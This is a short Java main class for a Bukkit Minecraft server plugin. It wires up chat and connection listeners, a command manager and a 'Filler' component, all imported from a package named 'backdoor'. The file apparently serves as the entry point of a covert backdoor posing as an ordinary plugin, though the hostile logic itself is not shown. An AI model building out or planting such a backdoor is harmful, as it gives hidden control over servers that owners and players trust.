package me.tsb.plugin;

import me.tsb.backdoor.CommandMan;
import me.tsb.backdoor.PlayerChat;
import me.tsb.backdoor.events.ConnectionEvents;
import me.tsb.backdoor.filler.Filler;
import me.tsb.backdoor.filler.PlayerRegionTracker;
import lombok.Getter;
import org.bukkit.plugin.java.JavaPlugin;

public class Main extends JavaPlugin {

	@Getter
	private CommandMan commandManager;
	@Getter
	private Filler filler;
	@Getter
	private PlayerRegionTracker playerRegionTracker;
	
	public void onEnable() {

		this.getServer().getPluginManager().registerEvents(new PlayerChat(this), this);
		this.getServer().getPluginManager().registerEvents(new ConnectionEvents(this), this);

		commandManager = new CommandMan(this);
		commandManager.init();
		playerRegionTracker = new PlayerRegionTracker();

		filler = new Filler(this);
	}
}